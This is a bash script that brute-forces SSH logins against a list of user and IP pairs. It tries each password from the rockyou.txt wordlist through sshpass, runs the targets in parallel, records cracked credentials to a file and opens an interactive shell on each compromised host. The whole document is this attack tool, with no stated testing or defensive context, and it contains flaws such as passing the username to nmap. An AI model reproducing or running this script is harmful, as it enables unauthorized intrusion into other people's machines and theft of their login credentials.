

login () { #user, ip
	output=output.txt

	nmap $1 -p 22
	if [ $? -eq 0 ];
		then 
			pass=""
			while read line;
			do 
				if sshpass -p "$line" ssh -t -t $1@$2 -p 22 "set -- '$SSHPATH/$ID'.*; [ -e \"\$1\" ]";
					then
						pass="$line"
						echo "Login Successful"
						echo "$1 $pass $2" | tee -a $output 									
						break
				fi
			done < rockyou.txt
			sshpass -p "$pass" ssh -t -t "$1"@"$2" -p 22
		else
			echo "Port is closed"
	fi

}



while read -r line;
do
	IFS=" " read -ra ADDR <<<"$line"
	
	for i in "${ADDR[0]}";
	do
	USER="$i" 
	done

	for i in "${ADDR[1]}";
	do 
	IP="$i"
	done

	echo "Attempting to login to $USER..."
	login $USER $IP &
	
done < input.txt
exit
